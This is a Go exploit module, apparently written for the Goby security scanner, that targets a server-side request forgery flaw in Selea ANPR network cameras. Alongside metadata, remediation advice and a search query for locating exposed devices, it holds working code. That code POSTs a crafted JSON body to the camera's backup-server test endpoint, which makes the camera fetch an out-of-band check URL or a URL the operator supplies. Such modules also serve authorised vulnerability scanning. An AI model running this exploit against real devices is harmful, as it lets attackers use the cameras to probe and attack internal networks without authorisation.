package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Selea ANPR Camera SSRF",
    "Description": "<p>ANPR Camera is a network camera launched by Selea.</p><p>ANPR Camera has an ssrf vulnerability. Attackers can use this vulnerability to scan the external network, the internal network where the server is located, local port scanning, and attack applications running on the internal network or local.</p>",
    "Impact": "Selea ANPR Camera SSRF",
    "Recommendation": "<p>The official repair plan has been released, please keep an eye on the official website for updates: <a href=\"https://www.selea.com\">https://www.selea.com</a></p><p>1. If it is not necessary, it is forbidden to access the system from the public network.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "Selea ANPR Camera",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "Selea ANPR Camera 服务端请求伪造漏洞",
            "Description": "<p>ANPR Camera 是 Selea 公司推出的一款网络摄像机。</p><p><span style=\"font-size: 16px;\">攻击者可以利用该漏洞扫描外网、服务器所在的内网、本地端口扫描，以及攻击运行在内网或本地的应用程序。</span><br></p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">攻击者可以利用该漏洞扫描外网、服务器所在的内网、本地端口扫描，以及攻击运行在内网或本地的应用程序。</span><br></p>",
            "Recommendation": "<p>官方已发布修复方案，请及时关注官方网站更新：<a href=\"https://www.selea.com\">https://www.selea.com</a></p><p>1、如非必要，禁止公网访问该系统。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "Selea ANPR Camera",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Selea ANPR Camera SSRF",
            "Description": "<p>ANPR Camera is a network camera launched by Selea.</p><p>ANPR Camera has an ssrf vulnerability. Attackers can use this vulnerability to scan the external network, the internal network where the server is located, local port scanning, and attack applications running on the internal network or local.</p>",
            "Impact": "Selea ANPR Camera SSRF",
            "Recommendation": "<p>The official repair plan has been released, please keep an eye on the official website for updates:&nbsp;<a href=\"https://www.selea.com\">https://www.selea.com</a></p><p>1. If it is not necessary, it is forbidden to access the system from the public network.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Product": "Selea ANPR Camera",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "title=\"Selea ANPR Camera\"",
    "GobyQuery": "title=\"Selea ANPR Camera\"",
    "Author": "AnMing",
    "Homepage": "https://www.selea.com",
    "DisclosureDate": "2019-05-22",
    "References": [
        "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5617.php"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Url",
            "type": "input",
            "value": "http://xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri := "/cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", u.HostInfo)
			cfg.Header.Store("Accept", "*/*")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = fmt.Sprintf("{\"test_type\":\"ip\",\"test_debug\":false,\"ipnotify_type\":\"http/get\",\"ipnotify_address\":\"http://%s\",\"ipnotify_username\":\"\",\"ipnotify_password\":\"\",\"ipnotify_port\":\"0\",\"ipnotify_content_type\":\"\",\"ipnotify_template\":\"\"}", checkUrl)
			_, err := httpclient.DoHttpRequest(u, cfg)
			if err != nil {
				return false
			}
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE"
			inputUrl := ss.Params["Url"].(string)
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.HostInfo)
			cfg.Header.Store("Accept", "*/*")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = fmt.Sprintf("{\"test_type\":\"ip\",\"test_debug\":false,\"ipnotify_type\":\"http/get\",\"ipnotify_address\":\"%s\",\"ipnotify_username\":\"\",\"ipnotify_password\":\"\",\"ipnotify_port\":\"0\",\"ipnotify_content_type\":\"\",\"ipnotify_template\":\"\"}", inputUrl)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = "Success!Please check your server!"
			} else {
				expResult.Success = false
				expResult.Output = "ERROR! Please check your input!"
			}
			return expResult
		},
	))
}
